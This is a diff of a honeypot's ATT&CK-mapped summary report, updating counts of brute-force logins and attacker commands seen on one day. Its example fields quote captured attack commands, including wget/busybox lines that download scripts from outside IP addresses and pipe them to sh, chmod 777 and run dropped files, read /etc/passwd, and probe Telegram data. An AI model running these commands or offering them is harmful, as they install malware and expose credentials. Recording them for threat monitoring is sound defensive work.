@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-09 18:04:12",
+  "generated": "2026-09-09 19:03:12",
   "totals": {
-    "commands": 4587,
-    "login_failed": 2482,
-    "login_success": 1454,
-    "sessions": 2721
+    "commands": 5464,
+    "login_failed": 2828,
+    "login_success": 1751,
+    "sessions": 3114
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 2482,
+      "count": 2828,
       "examples": [
         "admin / admin",
         "root / root",
@@ -21,14 +21,14 @@
         "linuxshell / enablelinuxshell"
       ],
       "first": "2026-09-09T00:03:10.052346Z",
-      "last": "2026-09-09T18:04:03.487886Z",
-      "unique_ips": 154
+      "last": "2026-09-09T19:01:35.866057Z",
+      "unique_ips": 167
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 1454,
+      "count": 1751,
       "examples": [
         "root / root",
         "ubuntu / Oracle",
@@ -37,14 +37,14 @@
         "ftpuser / ftpuser"
       ],
       "first": "2026-09-09T00:03:10.740292Z",
-      "last": "2026-09-09T18:04:04.047453Z",
-      "unique_ips": 87
+      "last": "2026-09-09T19:02:06.092103Z",
+      "unique_ips": 95
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 201,
+      "count": 203,
       "examples": [
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
         ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
@@ -53,14 +53,14 @@
         ">/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/"
       ],
       "first": "2026-09-09T00:03:11.283737Z",
-      "last": "2026-09-09T17:32:06.730174Z",
-      "unique_ips": 19
+      "last": "2026-09-09T18:32:20.879525Z",
+      "unique_ips": 20
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 60,
+      "count": 63,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "http://185.93.89.72/wget",
@@ -69,29 +69,30 @@
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t"
       ],
       "first": "2026-09-09T00:03:12.667622Z",
-      "last": "2026-09-09T17:32:06.730174Z",
-      "unique_ips": 18
+      "last": "2026-09-09T18:51:24.606301Z",
+      "unique_ips": 19
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 22,
+      "count": 24,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "sudo -n whoami 2>/dev/null",
         "sudo -S whoami 2>/dev/null",
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C\nuname=$(for c in unam"
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C\nuname=$(for c in unam",
+        "id"
       ],
       "first": "2026-09-09T00:03:12.667622Z",
-      "last": "2026-09-09T17:31:30.582241Z",
-      "unique_ips": 16
+      "last": "2026-09-09T18:32:20.879525Z",
+      "unique_ips": 17
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 21,
+      "count": 23,
       "examples": [
         "uname -a",
         "uname -s -v -n -r -m",
@@ -100,14 +101,14 @@
         "uname -s -m"
       ],
       "first": "2026-09-09T00:39:03.052905Z",
-      "last": "2026-09-09T15:30:47.490932Z",
+      "last": "2026-09-09T18:32:20.879525Z",
       "unique_ips": 16
     },
     {
       "id": "T1083",
       "name": "File and Directory Discovery",
       "tactic": "Discovery",
-      "count": 7,
+      "count": 8,
       "examples": [
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C\nuname=$(for c in unam",
         "cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /; rm -rf i; wget http://192.168.1.1:8088/i; curl -O htt",
@@ -115,7 +116,7 @@
         "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /va"
       ],
       "first": "2026-09-09T03:24:38.199378Z",
-      "last": "2026-09-09T15:30:48.332572Z",
+      "last": "2026-09-09T18:32:20.879525Z",
       "unique_ips": 7
     },
     {
@@ -132,6 +133,32 @@
       "unique_ips": 3
     },
     {
+      "id": "T1059.004",
+      "name": "Command and Scripting Interpreter: Unix Shell",
+      "tactic": "Execution",
+      "count": 4,
+      "examples": [
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C\nuname=$(for c in unam",
+        "cd /tmp && chmod +x R6uIuSLh && bash -c ./R6uIuSLh"
+      ],
+      "first": "2026-09-09T03:24:38.199378Z",
+      "last": "2026-09-09T18:32:20.879525Z",
+      "unique_ips": 3
+    },
+    {
+      "id": "T1070.004",
+      "name": "Indicator Removal: File Deletion",
+      "tactic": "Defense Evasion",
+      "count": 4,
+      "examples": [
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C\nuname=$(for c in unam",
+        "cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /; rm -rf i; wget http://192.168.1.1:8088/i; curl -O htt"
+      ],
+      "first": "2026-09-09T03:24:38.199378Z",
+      "last": "2026-09-09T18:32:20.879525Z",
+      "unique_ips": 3
+    },
+    {
       "id": "T1016",
       "name": "System Network Configuration Discovery",
       "tactic": "Discovery",
@@ -144,30 +171,16 @@
       "unique_ips": 3
     },
     {
-      "id": "T1059.004",
-      "name": "Command and Scripting Interpreter: Unix Shell",
-      "tactic": "Execution",
-      "count": 3,
+      "id": "T1087.001",
+      "name": "Account Discovery: Local Account",
+      "tactic": "Discovery",
+      "count": 1,
       "examples": [
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C\nuname=$(for c in unam",
-        "cd /tmp && chmod +x R6uIuSLh && bash -c ./R6uIuSLh"
+        "cat /etc/passwd"
       ],
-      "first": "2026-09-09T03:24:38.199378Z",
-      "last": "2026-09-09T06:53:44.999919Z",
-      "unique_ips": 3
-    },
-    {
-      "id": "T1070.004",
-      "name": "Indicator Removal: File Deletion",
-      "tactic": "Defense Evasion",
-      "count": 3,
-      "examples": [
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C\nuname=$(for c in unam",
-        "cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /; rm -rf i; wget http://192.168.1.1:8088/i; curl -O htt"
-      ],
-      "first": "2026-09-09T03:24:38.199378Z",
-      "last": "2026-09-09T06:53:44.999919Z",
-      "unique_ips": 3
+      "first": "2026-09-09T18:18:09.233976Z",
+      "last": "2026-09-09T18:18:09.233976Z",
+      "unique_ips": 1
     },
     {
       "id": "T1140",
@@ -185,15 +198,15 @@
   "unmapped": [
     [
       "shell",
-      1378
+      1664
     ],
     [
       "sh",
-      1378
+      1664
     ],
     [
       "system",
-      1377
+      1662
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
@@ -205,7 +218,7 @@
     ],
     [
       "enable",
-      16
+      17
     ],
     [
       "linuxshell",
@@ -252,16 +265,16 @@
       2
     ],
     [
-      "ping; sh",
-      1
+      "command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3",
+      2
     ],
     [
-      "/bin/busybox STC",
-      1
+      "python3 /tmp/bendi.py",
+      2
     ],
     [
-      "/bin/busybox hostname TOASTER",
-      1
+      "rm /tmp/bendi.py",
+      2
     ]
   ]
 }
